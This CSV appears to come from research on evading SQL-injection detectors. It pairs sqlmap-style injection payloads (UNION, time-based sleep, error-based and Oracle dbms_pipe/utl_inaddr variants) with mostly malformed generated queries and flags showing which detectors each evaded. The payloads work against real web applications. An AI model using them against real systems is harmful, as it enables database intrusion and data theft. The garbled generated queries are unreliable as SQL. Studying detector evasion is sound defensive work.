original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,SELECT -7054 ) FROM gzvf WHERE 9146 = 9146 OR 3038 = 3038,1,1,0,0,0,0,0
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(selection) FROM SQL injection detection WHERE NOT 0x7171706a71 = ""SQL"" GROUP BY concat (0x7171706a71,0x7171706a71,floor (Rad ( 0 ) *2 )",1,1,0,0,0,0,0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",SELECT MIN(selection) FROM SQL injection detection WHERE NOT ixp = '8514',1,0,1,1,1,1,1
1   )    )     )   and 6467  =  1864#,"SELECT * FROM SQL_injector WHERE NOT SQL_inject = ""valid"" AND NOT SELECT * FROM query: 1 ) ORDER BY * DESC LIMIT 6",1,0,1,1,1,1,1
"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",SELECT MIN(selection) FROM SQL injection detection WHERE NOT SELECT MIN(selection) FROM SQL SELECT MIN(selection) FROM query: 1',1,1,1,0,1,1,0
1'||  (  select 'xhcr' from dual where 9279  =  9279,SELECT 'xhcr' FROM SQL injection',1,0,1,1,1,1,1
-4323'   )    )    or 6968  =  1393,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT 6968 = 1393,1,1,1,1,1,1,1
"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1'+,1,1,1,1,1,1,1
-5350   )    )    or 9323  =  9323#,SELECT MIN(invalid SQL) FROM query: -5350 ) ORDER BY 9323 = 9323,1,1,1,0,0,0,0
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",SELECT MIN(sql injection) FROM SQL_Injections WHERE NOT chr ( 76 ) = 'dbms_pipe.receive_message',1,0,0,0,1,0,0
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = ""t1,all_users"" AND 9660 = (SELECT MIN(*) FROM SQL)",1,1,0,0,0,0,0
"-5132%""   )    )    or 3038  =  3038",SELECT MIN(3038 = 3038 FROM SQL injection detection,1,1,0,1,1,1,0
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
"1"" and 1668  =  8288",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: 1 WHERE NOT SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--","SELECT MIN(7152,7152--) FROM SQL_Injection WHERE 7152 = 7152 = 7152 AND union = 7152,7152,7152,7152-- as tqrm FROM qqrm WHERE 7152 = 7152 = 7152 AND 7152 = 7152,7152,7152--",1,1,0,0,0,0,0
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx","SELECT * FROM SQL injection, COUNT(*) FROM SELECT SELECT DISTINCT wtkx FROM sysusers WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 & ""wtkx"" = ""essl injection detection""",1,1,0,0,0,0,0
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,SELECT MIN(sqlp) FROM SQL injection detection,1,0,1,1,1,1,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,"SELECT * FROM query: SELECT NOT SQL_inject_required, COUNT(*) FROM query: SELECT DISTINCT 'keoy' FROM query: SELECT MIN(( 'keoy') FROM query: SELECT SUM((( 'keoy') FROM query: SELECT query: SELECT query: systomy' FROM query: SELECT query: find ( 5 ) AND (((((SELECT * FROM SELECT ORDER BY SELECT COUNT(*) FROM SELECT * FROM SELECT * FROM SELECT SELECT COUNT(*) FROM SELECT MIN((((((( 'keoy) FROM query: query: SELECT query:'sql', 'keoy') FROM query: SELECT query: 'yes') FROM query: SELECT query: 'yes', 'keoy', 'keoy') FROM query: query: SELECT query: 'yes', '",1,1,0,0,1,0,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,SELECT DISTINCT (SQL injection) FROM SQL SELECT DISTINCT (SQL injection)) FROM SQL SELECT DISTINCT (SQL ) FROM SQL),1,0,0,0,0,0,0
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof","SELECT MIN(1808,concat) FROM SQL_injection, 'rpof' FROM SQL, SELECT MIN(1808,1808,1808,1808,1 - st) FROM SQL,'sq injection detection' FROM SQL,'sq injection detection' FROM SQL, 'output' FROM SELECT MIN(1808,1808,1808,1808,1808,1906a71, 'rpof')) or (SELECT MIN(1808,'sql injection','sql injection') FROM SQL SELECT MIN(1808,concat) FROM SELECT SELECT MIN(1808, 'rpof) FROM SELECT SELECT MIN(1808,concat) FROM SQL - stu lt ( 0x7171706a71 - & feb')",1,1,0,0,1,0,0
1  )   where 2543  =  2543,SELECT * FROM query: 1 JOIN SQL injection query: 2543 = 2543 WHERE NOT SQL_Injection = 2543,0,0,1,1,1,1,1
1 and 6802  =  3592--,"SELECT * FROM query: 1 AND NOT SQL_inject = ""valid""",1,1,1,0,1,1,0
"1  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL))",0,1,0,0,0,0,0
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",SELECT MIN(4249 = 4249 = 4249 = 7259 //bkag) FROM SQL injection detection,1,1,0,0,0,0,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn",SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM SQL Query: 1' OR 9643 = 9643 = (SELECT MIN(succes) FROM Query: 1' ) ORDER BY cpfn,1,1,0,0,1,0,0
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1' 0x28 end ),1,1,1,0,1,1,0
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 JOIN detection of SQL_injection'",1,1,1,1,1,1,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm","SELECT * FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 AND conm_like 'conm'",1,1,0,1,0,0,0
-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,SELECT 'pber' FROM SQL injection detection',1,0,1,1,1,1,1
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL injection, SELECT SUM(short_number) FROM SQL SELECT MIN(short_number) FROM rdb$fields as t1,rdb$functions as t3,rdb$functions as t4 JOIN evade SQL injection detection'",1,1,0,1,1,1,0
"1%"" union all select null,null#",SELECT MIN(null#) FROM SQL injection detection,1,0,1,1,1,1,1
1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',SELECT 'vxfx' FROM SQL injection' WHERE 7038 = 7038 AND 9306 = 4187 )||',1,1,0,0,0,0,0
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,"SELECT DISTINCT t1.sql injection_diagnosis FROM SQL_Injections AS t1 JOIN (SELECT AS t2 ON t1.succes) = t2.sql injection_method_code WHERE NOT t2.sql injection_method_code ='sql injection') ORDER BY t2.sql - STRFT ( 113 ) +char ( 113 ) +char (SELECT MIN( ) FROM SQL SELECT MIN(sql ) FROM rlva) AS t1 WHERE t1.sq ='sql injection') +char (SELECT t1.sqlva','sql injection') = t2.sql injection_method_method_code FROM char( char ( 113 ) +char (SELECT t1.sqlva) FROM char( t2.sqlva) FROM SQL JOIN char( t2.sqlv) +char ( 113 ) +",0,1,0,0,0,0,0
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE 2861 = 2861 OR 4411 = ""Iupg""",1,0,1,0,0,0,0
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(*) FROM SQL injection detection),1,0,1,1,1,1,1
"1%""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,SELECT DISTINCT count ( * ) FROM SQL injection detection),1,0,1,1,1,1,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",SELECT DISTINCT ((*) FROM SQL injection detection) FROM SQL SELECT DISTINCT (SELECT DISTINCT (*) FROM (SELECT DISTINCT (*) FROM fzno)) FROM (SELECT DISTINCT (SELECT DISTINCT (*) FROM fzno)) FROM SQL injection detection),1,1,0,0,1,0,0
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',SELECT MIN(%) FROM SQL injection detection,1,0,0,1,1,1,0
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030","SELECT * FROM SQL AS t1 JOIN elt AS t2 ON t1.4249 = t2.4249 = t2.5030 = t2.5030 = t2.valid_sq_inject(),'sql injection') AND t2.elt = 4249 = 4249 = 4249 = 4249 = 7259 INTERSECT SELECT * FROM elt WHERE NOT i_sq = ""valid""",1,1,0,0,0,0,0
"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--","SELECT MIN(5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) FROM SELECT 5681 = 5681 = 5681",1,1,1,0,1,1,0
"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 - SELECT MIN(*) FROM SQL Injection)",0,1,0,0,0,0,0
"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",SELECT MIN(sql injection) FROM SQL_injection WHERE 3921 = 3921,1,0,1,1,0,1,0
1%'  )   and 4061  =  2730#,SELECT MIN(#2) FROM SQL injection detection,1,1,0,1,1,1,0
"-3215""  )   union all select 4457,4457,4457,4457,4457#",SELECT MIN(sql injection) FROM SQL -3215,1,0,1,1,1,1,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn","SELECT MIN(s) FROM SQL injection, COUNT(s) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM (SELECT SELECT MIN(s) FROM SELECT SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM SELECT SELECT MIN(s) FROM SQL SELECT SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL)",1,0,0,0,1,0,0
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --","SELECT MIN(sql injection) FROM SQL_injection WHERE 2764 = 2764 AND query: 1""",1,0,1,0,0,0,0
"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ","SELECT * FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(sys) FROM SQL SELECT SUM(CASE WHERE sysusers as sysusers as sysusers as sys4,sysusers as sys7 ) FROM SELECT SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(",1,1,0,1,1,1,0
"1%""  )   union all select null,null,null,null#","SELECT MIN(sql injection) FROM SQL - SELECT null,null,null FROM query: 1%",1,0,0,1,1,1,0
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,SELECT MIN(2815 = 2815) FROM SQL injection detection,1,1,0,1,1,1,0
-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,SELECT MIN(SQL) FROM SQL Injection) ORDER BY MIN(SQL),1,0,1,1,0,1,0
"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SQL,1,1,1,0,1,1,0
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"iif  (  3760  =  4785,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  ""","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" AND ((%) ='sql injection')",1,1,0,0,0,0,0
1'||  (  select 'etvo' from dual where 1557  =  1557,SELECT etvo FROM SQL injection detection WHERE NOT SELECT etvo FROM query: 1'|| (SELECT etvo FROM query: 1'||),1,1,1,1,1,1,1
select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  --,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  ""","SELECT DISTINCT esq_injection FROM SQL SELECT esq_injection_detection, COUNT(*) FROM (SELECT esq_injection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_dew ( (SELECT SUM((SELECT, COUNT(*) FROM SQL SELECT,'sql iv') FROM SQL SELECT SELECT esq_injection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_detection_",1,0,0,0,1,0,0
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,SELECT SELECT 'vuku' FROM SQL injection detection',1,0,1,1,1,1,1
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo","SELECT 8434 = 4516,4516 ) # bsqo FROM SQL AS t1 JOIN query: -8026 or elt ( 8434 = 4516,4516 ) # bsqo')",0,1,0,0,0,0,0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr","SELECT MIN(selection_numrr) FROM SQL injection detection WHERE NOT'sq injection detection' AND domain.domain.columns = 't1,domain.tables as t3' AND (SELECT MIN(selection_numrr) FROM SQL injection detection)",0,1,1,0,1,1,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql injected) FROM SQL - injection,1,0,1,1,1,1,1
select pg_sleep  (  5  )  # pjvi,"SELECT pg_sleep ( 5 ) # pjvi FROM SQL injection detection""",1,1,0,1,0,0,0
"1' union all select null,null#","SELECT DISTINCT null,null# FROM SQL injection",1,0,1,1,0,1,0
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SUM(SQL) FROM SQL SELECT SELECT SUM(SQL) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql injection) FROM SELECT ,1,1,1,0,1,1,0
"1' in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   #","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection'",1,1,0,0,1,0,0
"1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '","SELECT MIN(7982,concat) FROM SQL injection detection",1,0,1,1,1,1,1
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT sfmz FROM SQL JOIN detection of evade_sql_injection',0,0,1,1,1,1,1
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",SELECT MIN(sqtu) FROM SQL injection detection WHERE 2058 = 2058 OR 3038 = 3038,1,1,0,0,0,0,0
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --","SELECT MIN(4249 = 4249,7259 ) FROM SQL injection AS _executive FROM SQL_injection_for example_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_for_forest ='sq'",1,1,0,0,1,0,0
"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 5012 = 5012,1,0,1,1,1,1,1
"-2377%'   )    )     )   union all select 7706,7706--","SELECT MIN(sql injection) FROM SQL SELECT 7706,7706-- FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -2377%' )",1,1,0,0,1,0,0
